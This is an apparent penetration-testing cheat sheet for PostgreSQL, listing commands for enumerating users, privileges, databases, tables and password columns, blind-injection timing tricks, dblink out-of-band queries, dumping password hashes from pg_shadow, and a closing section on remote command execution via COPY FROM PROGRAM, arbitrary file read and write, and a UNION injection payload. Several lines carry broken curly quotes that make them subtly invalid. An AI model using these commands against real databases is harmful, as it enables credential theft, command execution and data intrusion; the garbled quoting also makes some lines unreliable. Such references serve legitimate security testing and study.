# PostgreSQL

## Database commands

### Comments

```
SELECT 1; –comment
SELECT /*comment*/1;
```

### Version

```
SELECT version();
```

### Users

```
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user WHERE usesuper IS TRUE
SELECT usename FROM pg_user;
SELECT getpgusername();
SELECT usename FROM pg_user
CREATE USER <name> PASSWORD '<pass>';
CREATE USER <name> PASSWORD '<pass>′ CREATEUSER;
DROP USER <name>;
ALTER USER <name> CREATEUSER CREATEDB;
```

### Privileges

```
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user;
```

### Database info

```
SELECT current_database();
SELECT datname FROM pg_database;
SELECT current_setting(‘<dir>’);
SELECT current_setting(‘<setting hba file>’); 
```

### List tables

```
SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r',") AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid);
```

### List columns

```
SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public');
```

### Filter table by column name

```
SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND attname LIKE '%<password>%';
```

### Access nth row

```
SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET ;
```

### String operations

```
SELECT substr('<str>', <start>, <end>); 
SELECT 6 & 2;
SELECT chr(65);
SELECT ascii('A');
SELECT CAST(1 as varchar);
SELECT CAST('1' as int);
SELECT ‘A’ || 'B’; 
SELECT CHR(65)||CHR(66);
```

### Conditional execution

```
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; -- returns A
```

### Time delay

```
SELECT pg_sleep(<seconds>); -- postgres 8.2+ only
CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' language 'C' STRICT; SELECT sleep(<seconds>);
```

### DNS and HTTP

```
SELECT * FROM dblink('host=<host> user=<usr>  dbname=<bd>', 'SELECT version()') RETURNS (result TEXT);
SELECT inet_server_addr();
SELECT inet_server_port();
```

## Passwords

```
SELECT usename, passwd FROM pg_shadow;
```

**Format:** MD5

## Vulnerabilities

### RCE

```
CREATE TABLE exec(output text);
COPY exec FROM program '<command>';
```

### Arbitrary file access

```
CREATE TABLE mydata(t text);
COPY mydata FROM '<path to file>'; 
```

#### SQLi

```
…' UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET <nth repeat for each row>;
```

### Arbitrary file write

```
CREATE TABLE mytable (mycol text);
INSERT INTO mytable(mycol) VALUES ('<string>');
COPY mytable (mycol) TO '<dest file>'; 
```



